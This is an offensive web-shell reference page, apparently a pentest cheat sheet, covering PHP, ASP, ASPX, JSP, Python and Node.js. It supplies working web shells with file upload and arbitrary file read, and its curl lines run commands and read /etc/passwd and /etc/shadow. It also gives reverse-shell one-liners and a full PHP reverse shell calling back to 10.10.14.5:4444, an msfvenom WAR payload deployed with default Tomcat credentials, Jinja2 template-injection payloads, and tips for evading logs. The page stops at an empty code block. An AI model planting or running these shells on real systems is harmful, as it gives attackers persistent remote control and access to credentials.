---
title: Web Shells
description: Complete web shell reference with ready-to-deploy payloads across PHP, ASP, ASPX, JSP, Python, and Node.js — including obfuscation, upload bypass techniques, and post-deployment usage.
navigation:
  icon: i-lucide-globe
  title: Web Shells
---

A web shell is a **server-side script** uploaded to a web server that provides remote command execution through HTTP requests. Unlike reverse shells that require a direct network connection, web shells operate through the **existing web server** — every command travels through normal HTTP/HTTPS traffic, making them harder to detect by network monitoring tools.

Web shells are used when:
- You can **upload files** to the web server (file upload vulnerability)
- You have **write access** to the web root (LFI, RCE, compromised credentials)
- Reverse shells are blocked by **egress firewalls**
- You need **persistent access** that survives connection drops
- You want to operate through **legitimate HTTP traffic**

::note
Replace IP addresses, ports, and file paths with your engagement details. Always clean up web shells after testing. Leaving web shells on production systems is a serious security risk.
::

---

## :icon{name="i-lucide-lightbulb"} How Web Shells Work

### The Architecture

```
┌──────────────┐         HTTP Request          ┌──────────────────────────┐
│   ATTACKER   │──── GET /shell.php?cmd=id ───→│      TARGET SERVER       │
│   Browser    │                               │                          │
│   or curl    │                               │  Web Server (Apache/IIS) │
│              │◄── HTTP Response ─────────────│  ↓                       │
│  Receives    │    uid=33(www-data)           │  shell.php               │
│  cmd output  │                               │  ↓                       │
└──────────────┘                               │  system("id")            │
                                               │  ↓                       │
                                               │  OS Command Execution    │
                                               └──────────────────────────┘
```

### Web Shell vs Reverse Shell

| Feature | Web Shell | Reverse Shell |
| ------- | --------- | ------------- |
| **Connection** | Uses existing HTTP/S | New TCP connection |
| **Firewall** | :badge{label="Bypasses All" color="green"} Travels over 80/443 | :badge{label="May Be Blocked" color="orange"} Outbound ports |
| **Persistence** | :badge{label="Survives Reboots" color="green"} File on disk | :badge{label="Lost on Disconnect" color="red"} In-memory |
| **Interactivity** | Command-at-a-time | Fully interactive |
| **Detection** | File on disk, access logs | Network anomaly |
| **Stealth** | Blends with web traffic | Unusual outbound connection |
| **Best For** | Persistent access, firewalled networks | Interactive exploitation |

### Web Shell Execution Flow

::steps{level="4"}

#### Upload the Shell

Get a server-side script onto the target web server through file upload vulnerabilities, LFI/RFI, SQL injection into file write, CMS exploits, or compromised FTP/SSH credentials.

#### Access via HTTP

Send HTTP requests to the uploaded shell with commands as parameters. The web server's interpreter (PHP, ASP, JSP) executes the script, which runs OS commands.

#### Receive Output

The command output is returned in the HTTP response body. The attacker sees results in their browser, curl output, or custom client.

#### Escalate Access

Use the web shell to enumerate the system, upload further tools, establish a reverse shell for interactive access, or perform privilege escalation.

::

::tip
Web shells are best used as a **staging mechanism** — upload the web shell, use it to enumerate the system and test connectivity, then establish a proper reverse shell for interactive work.
::

---

## :icon{name="i-simple-icons-php"} PHP Web Shells

### PHP Shell Fundamentals

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="PHP" color="green"}
  :badge{label="Most Common" color="blue"}
  :badge{label="Apache" color="orange"}
  :badge{label="Nginx" color="red"}
  :badge{label="Linux" color="purple"}
  :badge{label="Windows" color="neutral"}
::

![PHP](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white) ![Apache](https://img.shields.io/badge/Apache-D22128?style=for-the-badge&logo=apache&logoColor=white) ![Nginx](https://img.shields.io/badge/Nginx-009639?style=for-the-badge&logo=nginx&logoColor=white)

PHP is the **most common web shell language** because PHP powers approximately 77% of all websites with a known server-side language. PHP web shells are effective on any server running PHP — Apache, Nginx, LiteSpeed, IIS with PHP installed, and most shared hosting environments.

PHP provides **multiple functions** for command execution, each with slightly different behavior. If one function is disabled in `php.ini` (`disable_functions`), another may still work.

| Function | Behavior | Returns Output | Returns Exit Code |
| -------- | -------- | -------------- | ----------------- |
| `system()` | Executes and prints output | :badge{label="Yes (prints)" color="green"} | :badge{label="Yes" color="green"} |
| `exec()` | Executes, returns last line | :badge{label="Last line only" color="orange"} | :badge{label="Yes" color="green"} |
| `shell_exec()` | Executes via shell | :badge{label="Yes (returns)" color="green"} | :badge{label="No" color="red"} |
| `passthru()` | Executes, passes raw output | :badge{label="Yes (binary safe)" color="green"} | :badge{label="Yes" color="green"} |
| `popen()` | Opens process pipe | :badge{label="Via pipe" color="orange"} | :badge{label="On close" color="orange"} |
| `proc_open()` | Full process control | :badge{label="Via pipes" color="orange"} | :badge{label="Yes" color="green"} |
| Backticks `` ` ` `` | Shell execution operator | :badge{label="Yes (returns)" color="green"} | :badge{label="No" color="red"} |

---

### Minimal One-Line Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="PHP" color="green"}
  :badge{label="Minimal" color="blue"}
  :badge{label="One-Liner" color="orange"}
  :badge{label="Quick Deploy" color="red"}
::

The smallest possible web shells — perfect for tight file upload size limits, injecting into existing PHP files, or when you need the absolute minimum footprint.

```php [system() — Most reliable]
<?php system($_GET['cmd']); ?>
```

```php [shell_exec() — Returns output as string]
<?php echo shell_exec($_GET['cmd']); ?>
```

```php [exec() — Returns last line]
<?php echo exec($_GET['cmd']); ?>
```

```php [passthru() — Binary-safe output]
<?php passthru($_GET['cmd']); ?>
```

```php [Backtick operator]
<?php echo `$_GET['cmd']`; ?>
```

```php [POST parameter — Harder to find in access logs]
<?php system($_POST['cmd']); ?>
```

```php [Request parameter — Works with GET, POST, and COOKIE]
<?php system($_REQUEST['cmd']); ?>
```

```php [Cookie-based — Invisible in URL and POST body]
<?php system($_COOKIE['cmd']); ?>
```

```php [Header-based — Stealthiest]
<?php system($_SERVER['HTTP_X_CMD']); ?>
```

**Usage examples:**

```bash [GET request — curl]
curl "http://target.com/shell.php?cmd=id"
curl "http://target.com/shell.php?cmd=whoami"
curl "http://target.com/shell.php?cmd=cat+/etc/passwd"
curl "http://target.com/shell.php?cmd=ls+-la+/home/"
```

```bash [POST request — curl]
curl -X POST "http://target.com/shell.php" -d "cmd=id"
curl -X POST "http://target.com/shell.php" -d "cmd=cat /etc/shadow"
```

```bash [Cookie-based — curl]
curl "http://target.com/shell.php" -b "cmd=id"
```

```bash [Header-based — curl]
curl "http://target.com/shell.php" -H "X-CMD: id"
```

::tip
**POST-based** and **header-based** shells are more stealthy because the command doesn't appear in Apache/Nginx access logs (which log GET parameters but typically not POST bodies or custom headers).
::

---

### Functional PHP Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="PHP" color="green"}
  :badge{label="Functional" color="blue"}
  :badge{label="File Upload" color="orange"}
  :badge{label="File Manager" color="red"}
  :badge{label="Interactive" color="purple"}
::

Shells with additional functionality beyond basic command execution — file operations, directory listing, system information, and interactive terminals.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Command + Info"}
  ```php [shell_info.php — System info + command execution]
  <?php
  if(isset($_GET['cmd'])) {
      echo '<pre>' . htmlspecialchars(shell_exec($_GET['cmd'])) . '</pre>';
  } else {
      echo '<h3>System Information</h3>';
      echo '<pre>';
      echo 'User: ' . shell_exec('whoami');
      echo 'Hostname: ' . shell_exec('hostname');
      echo 'OS: ' . php_uname() . "\n";
      echo 'PHP: ' . phpversion() . "\n";
      echo 'Server: ' . $_SERVER['SERVER_SOFTWARE'] . "\n";
      echo 'Document Root: ' . $_SERVER['DOCUMENT_ROOT'] . "\n";
      echo 'CWD: ' . getcwd() . "\n";
      echo '</pre>';
  }
  ?>
  <form method="GET">
  <input name="cmd" size="60" placeholder="Enter command...">
  <input type="submit" value="Execute">
  </form>
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Command + Upload"}
  ```php [shell_upload.php — Execute commands + upload files]
  <?php
  // Command Execution
  if(isset($_GET['cmd'])) {
      echo '<pre>' . htmlspecialchars(shell_exec($_GET['cmd'])) . '</pre>';
  }

  // File Upload
  if(isset($_FILES['file'])) {
      $target = $_FILES['file']['name'];
      if(isset($_POST['path']) && !empty($_POST['path'])) {
          $target = $_POST['path'] . '/' . $target;
      }
      if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
          echo '<p style="color:green">[+] Uploaded: ' . htmlspecialchars($target) . '</p>';
      } else {
          echo '<p style="color:red">[-] Upload failed</p>';
      }
  }
  ?>
  <h4>Command Execution</h4>
  <form method="GET">
  <input name="cmd" size="60" placeholder="Command...">
  <input type="submit" value="Run">
  </form>

  <h4>File Upload</h4>
  <form method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input name="path" size="30" placeholder="Upload path (optional)">
  <input type="submit" value="Upload">
  </form>
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="File Reader"}
  ```php [shell_reader.php — Read arbitrary files]
  <?php
  if(isset($_GET['file'])) {
      $content = @file_get_contents($_GET['file']);
      if($content !== false) {
          echo '<pre>' . htmlspecialchars($content) . '</pre>';
      } else {
          echo '<p style="color:red">[-] Cannot read file</p>';
      }
  }
  if(isset($_GET['cmd'])) {
      echo '<pre>' . htmlspecialchars(shell_exec($_GET['cmd'])) . '</pre>';
  }
  ?>
  <form method="GET">
  File: <input name="file" size="40" placeholder="/etc/passwd">
  <input type="submit" value="Read">
  </form>
  <form method="GET">
  Cmd: <input name="cmd" size="40" placeholder="id">
  <input type="submit" value="Exec">
  </form>
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="Database Shell"}
  ```php [shell_db.php — MySQL query execution]
  <?php
  if(isset($_POST['query']) && isset($_POST['host'])) {
      $conn = new mysqli($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
      if($conn->connect_error) {
          echo '<p style="color:red">Connection failed: ' . $conn->connect_error . '</p>';
      } else {
          $result = $conn->query($_POST['query']);
          if($result) {
              echo '<table border="1"><tr>';
              $fields = $result->fetch_fields();
              foreach($fields as $f) echo '<th>' . $f->name . '</th>';
              echo '</tr>';
              while($row = $result->fetch_assoc()) {
                  echo '<tr>';
                  foreach($row as $val) echo '<td>' . htmlspecialchars($val) . '</td>';
                  echo '</tr>';
              }
              echo '</table>';
          }
          $conn->close();
      }
  }
  ?>
  <form method="POST">
  Host: <input name="host" value="localhost" size="15">
  User: <input name="user" size="10">
  Pass: <input name="pass" type="password" size="10">
  DB: <input name="db" size="10"><br>
  Query: <textarea name="query" cols="60" rows="4">SHOW DATABASES;</textarea><br>
  <input type="submit" value="Execute Query">
  </form>
  ```
  :::
::

---

### Full-Featured PHP Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="PHP" color="green"}
  :badge{label="Full Featured" color="blue"}
  :badge{label="File Manager" color="orange"}
  :badge{label="Terminal" color="red"}
  :badge{label="GUI" color="purple"}
::

![p0wny](https://img.shields.io/badge/p0wny--shell-000000?style=for-the-badge) ![WSO](https://img.shields.io/badge/WSO_Shell-333333?style=for-the-badge)

Production-quality web shells with full GUI interfaces, file managers, database clients, and interactive terminals. These are **single-file** deployments with no dependencies.

::card-group
  ::card
  ---
  title: p0wny-shell
  icon: i-simple-icons-github
  to: https://github.com/flozz/p0wny-shell
  target: _blank
  ---
  Single-file PHP shell with interactive terminal UI, working directory tracking, and command history. Clean, minimal, and effective.
  ::

  ::card
  ---
  title: PentestMonkey PHP Reverse Shell
  icon: i-simple-icons-github
  to: https://github.com/pentestmonkey/php-reverse-shell
  target: _blank
  ---
  The classic full-featured PHP reverse shell — reliable and widely used. Converts a web shell into a reverse connection.
  ::

  ::card
  ---
  title: WhiteWinterWolf PHP Web Shell
  icon: i-simple-icons-github
  to: https://github.com/WhiteWinterWolf/wwwolf-php-webshell
  target: _blank
  ---
  Feature-rich PHP web shell with file manager, command execution, and self-cleanup capabilities.
  ::

  ::card
  ---
  title: b374k Shell
  icon: i-simple-icons-github
  to: https://github.com/b374k/b374k
  target: _blank
  ---
  Full-featured PHP shell with file manager, reverse shell, bind shell, database client, and encoder. Password-protected.
  ::
::

---

### PHP Reverse Shell from Web Shell

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="PHP" color="green"}
  :badge{label="Upgrade" color="blue"}
  :badge{label="Web Shell → Reverse Shell" color="orange"}
  :badge{label="Interactive" color="red"}
::

Once you have a basic web shell, upgrade to a **reverse shell** for interactive access. Execute these through your web shell's command parameter.

```bash [Trigger reverse shell via web shell — Bash]
# URL-encoded bash reverse shell via GET parameter
curl "http://target.com/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"
```

```bash [Trigger reverse shell — Python]
curl "http://target.com/shell.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

```bash [Trigger reverse shell — Netcat mkfifo]
curl "http://target.com/shell.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.5+4444+>/tmp/f"
```

```bash [Trigger reverse shell — Perl]
curl "http://target.com/shell.php?cmd=perl+-e+'use+Socket;\$i=\"10.10.14.5\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">%26S\");open(STDOUT,\">%26S\");open(STDERR,\">%26S\");exec(\"/bin/sh+-i\");};'"
```

```php [PentestMonkey reverse shell — Upload as .php]
<?php
// Modify IP and port, save as revshell.php, upload via web shell
set_time_limit(0);
$ip = '10.10.14.5';
$port = 4444;
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/bash -i';

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit(1); }

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { exit(1); }

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (1) {
    if (feof($sock)) break;
    if (feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $write_a = null; $error_a = null;
    stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}
fclose($sock);
foreach ($pipes as $p) fclose($p);
proc_close($process);
?>
```

---

## :icon{name="i-lucide-monitor"} ASP / ASPX Web Shells (Windows/IIS)

### Classic ASP Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="ASP" color="blue"}
  :badge{label="Windows" color="green"}
  :badge{label="IIS" color="orange"}
  :badge{label="VBScript" color="red"}
  :badge{label="Legacy" color="purple"}
::

![ASP](https://img.shields.io/badge/ASP-512BD4?style=for-the-badge&logo=dotnet&logoColor=white) ![IIS](https://img.shields.io/badge/IIS-0078D4?style=for-the-badge&logo=windows&logoColor=white)

Classic ASP (Active Server Pages) uses VBScript and runs on **IIS (Internet Information Services)** on Windows. While considered legacy, many enterprise environments still run Classic ASP applications.

ASP shells execute commands through `WScript.Shell` COM objects, which provide access to Windows command-line tools (`cmd.exe`, `powershell.exe`).

::tabs
  :::tabs-item{icon="i-lucide-code" label="Minimal"}
  ```asp [cmd.asp — Minimal one-liner]
  <%Set o=Server.CreateObject("WSCRIPT.SHELL"):Set r=o.Exec("cmd /c "&Request("cmd")):Response.Write r.StdOut.ReadAll%>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Standard"}
  ```asp [shell.asp — Standard with form]
  <%
  Dim oScript, oScriptNet, oFileSys, szCMD, szTempFile

  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

  szCMD = Request.Form("cmd")

  If szCMD <> "" Then
      szTempFile = "C:\Windows\Temp\" & oFileSys.GetTempName()
      Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)

      Set oFile = oFileSys.OpenTextFile(szTempFile, 1)
      Response.Write "<pre>" & Server.HTMLEncode(oFile.ReadAll) & "</pre>"
      oFile.Close
      oFileSys.DeleteFile szTempFile
  End If
  %>
  <html><body>
  <form method="POST">
  <input name="cmd" size="60" value="<%=Server.HTMLEncode(szCMD)%>">
  <input type="submit" value="Execute">
  </form>
  </body></html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="PowerShell Exec"}
  ```asp [shell_ps.asp — Execute PowerShell commands]
  <%
  Dim oShell, cmd, output
  Set oShell = Server.CreateObject("WSCRIPT.SHELL")

  cmd = Request("cmd")
  If cmd <> "" Then
      Set exec = oShell.Exec("powershell.exe -nop -ep bypass -c " & cmd)
      output = exec.StdOut.ReadAll()
      If exec.StdErr.AtEndOfStream = False Then
          output = output & vbCrLf & "STDERR: " & exec.StdErr.ReadAll()
      End If
      Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"
  End If
  %>
  <form method="GET">
  PS> <input name="cmd" size="60" placeholder="Get-Process">
  <input type="submit" value="Run">
  </form>
  ```
  :::
::

---

### ASPX Shells (.NET)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="ASPX" color="blue"}
  :badge{label="Windows" color="green"}
  :badge{label=".NET" color="orange"}
  :badge{label="IIS" color="red"}
  :badge{label="C#" color="purple"}
  :badge{label="Modern" color="neutral"}
::

![ASPX](https://img.shields.io/badge/ASPX-512BD4?style=for-the-badge&logo=dotnet&logoColor=white)

ASPX (ASP.NET) web shells use **C# or VB.NET** and run on the **.NET Framework** under IIS. They are more powerful than Classic ASP shells, with access to the full .NET class library for process management, file I/O, registry access, and network operations.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Minimal"}
  ```aspx [cmd.aspx — Minimal]
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  if (Request["cmd"] != null) {
      Process p = new Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + Request["cmd"];
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.StartInfo.RedirectStandardError = true;
      p.Start();
      Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd()) + "</pre>");
  }
  %>
  <form method="GET"><input name="cmd" size="60"><input type="submit" value="Run"></form>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="PowerShell Exec"}
  ```aspx [shell_ps.aspx — PowerShell via ASPX]
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  if (Request["cmd"] != null) {
      ProcessStartInfo psi = new ProcessStartInfo();
      psi.FileName = "powershell.exe";
      psi.Arguments = "-nop -ep bypass -c \"" + Request["cmd"] + "\"";
      psi.UseShellExecute = false;
      psi.RedirectStandardOutput = true;
      psi.RedirectStandardError = true;
      psi.CreateNoWindow = true;

      Process p = Process.Start(psi);
      string output = p.StandardOutput.ReadToEnd();
      string error = p.StandardError.ReadToEnd();
      p.WaitForExit();

      Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
      if (!string.IsNullOrEmpty(error))
          Response.Write("<pre style='color:red'>" + Server.HtmlEncode(error) + "</pre>");
  }
  %>
  <form method="GET">
  PS> <input name="cmd" size="60" placeholder="Get-ChildItem C:\Users\">
  <input type="submit" value="Execute">
  </form>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="File Upload"}
  ```aspx [upload.aspx — File upload shell]
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.IO" %>
  <%
  if (Request.Files.Count > 0) {
      var file = Request.Files[0];
      string path = Request["path"] ?? Server.MapPath("~/");
      string fullPath = Path.Combine(path, file.FileName);
      file.SaveAs(fullPath);
      Response.Write("<p style='color:green'>[+] Saved: " + Server.HtmlEncode(fullPath) + "</p>");
  }
  if (Request["cmd"] != null) {
      Process p = new Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + Request["cmd"];
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();
      Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
  }
  %>
  <h4>Command</h4>
  <form method="GET"><input name="cmd" size="50"><input type="submit" value="Run"></form>
  <h4>Upload</h4>
  <form method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input name="path" size="30" placeholder="C:\inetpub\wwwroot">
  <input type="submit" value="Upload">
  </form>
  ```
  :::
::

**Usage:**

```powershell [curl — Execute commands via ASPX shell]
curl "http://target.com/shell.aspx?cmd=whoami"
curl "http://target.com/shell.aspx?cmd=ipconfig+/all"
curl "http://target.com/shell.aspx?cmd=type+C:\Users\Administrator\Desktop\flag.txt"
curl "http://target.com/shell.aspx?cmd=powershell+-c+Get-Process"
```

::card-group
  ::card
  ---
  title: ASPX Web Shell Collection
  icon: i-simple-icons-github
  to: https://github.com/tennc/webshell
  target: _blank
  ---
  10K+ ⭐ — Massive collection of web shells including multiple ASPX variants.
  ::

  ::card
  ---
  title: Kali ASPX Shell
  icon: i-lucide-terminal
  to: https://www.kali.org/tools/webshells/
  target: _blank
  ---
  Pre-installed web shells in Kali Linux at `/usr/share/webshells/`.
  ::
::

---

## :icon{name="i-lucide-coffee"} JSP Web Shells (Java/Tomcat)

### JSP Shell Fundamentals

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="JSP" color="green"}
  :badge{label="Java" color="blue"}
  :badge{label="Tomcat" color="orange"}
  :badge{label="JBoss" color="red"}
  :badge{label="WebLogic" color="purple"}
  :badge{label="Cross-Platform" color="neutral"}
::

![Java](https://img.shields.io/badge/JSP-ED8B00?style=for-the-badge&logo=openjdk&logoColor=white) ![Tomcat](https://img.shields.io/badge/Tomcat-F8DC75?style=for-the-badge&logo=apachetomcat&logoColor=black)

JSP (JavaServer Pages) web shells run on **Java application servers** — Apache Tomcat, JBoss/WildFly, WebLogic, GlassFish, and Jetty. JSP shells are **cross-platform** — the same shell works on both Linux and Windows servers because Java is platform-independent.

JSP shells use `Runtime.getRuntime().exec()` for command execution, which behaves differently from shell execution — it doesn't support pipes, redirects, or shell builtins directly. For complex commands, wrap them in `bash -c` (Linux) or `cmd /c` (Windows).

::tabs
  :::tabs-item{icon="i-lucide-code" label="Minimal"}
  ```jsp [cmd.jsp — Minimal]
  <%@ page import="java.util.*,java.io.*"%>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(cmd);
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      out.print("<pre>");
      while ((line = br.readLine()) != null) out.println(line);
      out.print("</pre>");
  }
  %>
  <form method="GET"><input name="cmd" size="60"><input type="submit" value="Run"></form>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Cross-Platform"}
  ```jsp [shell.jsp — Auto-detect OS]
  <%@ page import="java.util.*,java.io.*"%>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");
      String[] command;
      if (isWindows) {
          command = new String[]{"cmd.exe", "/c", cmd};
      } else {
          command = new String[]{"/bin/bash", "-c", cmd};
      }

      ProcessBuilder pb = new ProcessBuilder(command);
      pb.redirectErrorStream(true);
      Process p = pb.start();
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;

      out.print("<pre>");
      while ((line = br.readLine()) != null) {
          out.println(line);
      }
      out.print("</pre>");
      p.waitFor();
  }

  out.println("<p>OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version") + "</p>");
  out.println("<p>User: " + System.getProperty("user.name") + "</p>");
  out.println("<p>Java: " + System.getProperty("java.version") + "</p>");
  %>
  <form method="GET">
  <input name="cmd" size="60" placeholder="id (Linux) or whoami (Windows)">
  <input type="submit" value="Execute">
  </form>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="WAR Deployment"}
  ```bash [Generate WAR file for Tomcat deployment]
  # Method 1: msfvenom WAR shell
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

  # Deploy via Tomcat Manager:
  # http://target:8080/manager/html
  # Upload WAR file → auto-deploys

  # Access at:
  # http://target:8080/shell/

  # Method 2: Manual WAR creation with cmd.jsp
  mkdir -p webshell/WEB-INF
  # Create cmd.jsp in webshell/ directory
  # Create web.xml in webshell/WEB-INF/
  cd webshell && jar -cvf ../cmd.war . && cd ..

  # Method 3: curl upload to Tomcat Manager
  curl -u 'tomcat:tomcat' --upload-file shell.war "http://target:8080/manager/text/deploy?path=/shell"
  ```

  ```xml [WEB-INF/web.xml — Minimal web.xml for WAR]
  <?xml version="1.0" encoding="UTF-8"?>
  <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
      <servlet>
          <servlet-name>cmd</servlet-name>
          <jsp-file>/cmd.jsp</jsp-file>
      </servlet>
  </web-app>
  ```
  :::
::

**Usage:**

```bash [JSP shell via curl]
curl "http://target:8080/cmd.jsp?cmd=id"
curl "http://target:8080/cmd.jsp?cmd=whoami"

# Linux commands need bash -c for pipes and redirects
curl "http://target:8080/shell.jsp?cmd=cat+/etc/passwd"

# Windows
curl "http://target:8080/shell.jsp?cmd=type+C:\Users\Administrator\flag.txt"
```

::note
`Runtime.exec()` does NOT use a shell by default. Commands with **pipes** (`|`), **redirects** (`>`), or **semicolons** (`;`) won't work directly. Use the cross-platform version with `bash -c` / `cmd /c` wrapper or use `ProcessBuilder`.
::

---

## :icon{name="i-lucide-code"} Other Language Web Shells

### Python Web Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Python" color="green"}
  :badge{label="Flask" color="blue"}
  :badge{label="Django" color="orange"}
  :badge{label="CGI" color="red"}
  :badge{label="WSGI" color="purple"}
::

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)

Python web shells work on servers running **Python CGI**, **Flask**, **Django**, or any Python-based web framework. They're also useful when you can inject Python code into templates (SSTI — Server-Side Template Injection).

::tabs
  :::tabs-item{icon="i-lucide-code" label="CGI Shell"}
  ```python [shell.py — Python CGI web shell]
  #!/usr/bin/env python3
  import cgi
  import subprocess
  import html

  print("Content-Type: text/html\n")
  form = cgi.FieldStorage()
  cmd = form.getvalue('cmd', '')

  print("<html><body>")
  if cmd:
      try:
          output = subprocess.check_output(
              cmd, shell=True, stderr=subprocess.STDOUT, timeout=10
          ).decode()
          print(f"<pre>{html.escape(output)}</pre>")
      except subprocess.CalledProcessError as e:
          print(f"<pre style='color:red'>{html.escape(e.output.decode())}</pre>")
      except Exception as e:
          print(f"<pre style='color:red'>Error: {html.escape(str(e))}</pre>")
  print("""
  <form method="GET">
  <input name="cmd" size="60" placeholder="id">
  <input type="submit" value="Execute">
  </form>
  </body></html>
  """)
  ```

  ```bash [Deploy CGI shell]
  # Copy to CGI directory
  cp shell.py /var/www/cgi-bin/shell.py
  chmod +x /var/www/cgi-bin/shell.py

  # Access:
  curl "http://target.com/cgi-bin/shell.py?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Flask Shell"}
  ```python [flask_shell.py — Standalone Flask web shell]
  from flask import Flask, request
  import subprocess, html

  app = Flask(__name__)

  @app.route('/', methods=['GET', 'POST'])
  def shell():
      output = ''
      cmd = request.args.get('cmd', '') or request.form.get('cmd', '')
      if cmd:
          try:
              output = subprocess.check_output(
                  cmd, shell=True, stderr=subprocess.STDOUT, timeout=15
              ).decode()
          except Exception as e:
              output = str(e)

      return f'''<html><body>
      <pre>{html.escape(output)}</pre>
      <form method="GET">
      <input name="cmd" size="60" placeholder="Command...">
      <input type="submit" value="Execute">
      </form></body></html>'''

  if __name__ == '__main__':
      app.run(host='0.0.0.0', port=8080)
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SSTI Payloads"}
  ```python [Jinja2 SSTI — Read files]
  {{ ''.__class__.__mro__[1].__subclasses__()[287]('/etc/passwd').read() }}
  ```

  ```python [Jinja2 SSTI — RCE]
  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
  {{ ''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate() }}
  ```

  ```python [Jinja2 SSTI — Reverse shell]
  {{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"').read() }}
  ```
  :::
::

---

### Node.js Web Shells

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Node.js" color="green"}
  :badge{label="JavaScript" color="blue"}
  :badge{label="Express" color="orange"}
  :badge{label="SSJS" color="red"}
::

![Node.js](https://img.shields.io/badge/Node.js-5FA04E?style=for-the-badge&logo=nodedotjs&logoColor=white)

Node.js web shells are used when you can inject JavaScript into **server-side Node.js applications** — through SSTI in template engines (Pug, EJS, Handlebars), code injection, or deserialization vulnerabilities.

```javascript [node_shell.js — Standalone Express web shell]
const http = require('http');
const { execSync } = require('child_process');
const url = require('url');

http.createServer((req, res) => {
    const query = url.parse(req.url, true).query;
    res.writeHead(200, {'Content-Type': 'text/plain'});

    if (query.cmd) {
        try {
            const output = execSync(query.cmd, {timeout: 10000}).toString();
            res.end(output);
        } catch(e) {
            res.end('Error: ' + e.stderr.toString());
        }
    } else {
        res.end('Usage: ?cmd=id\n');
    }
}).listen(8080);
```

```javascript [Node.js — eval() injection payload]
// If you can inject into eval(), require(), or vm.runInNewContext()
require('child_process').execSync('id').toString()
require('child_process').execSync('cat /etc/passwd').toString()

// Reverse shell via eval injection
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```

```javascript [EJS SSTI — Server-Side Template Injection]
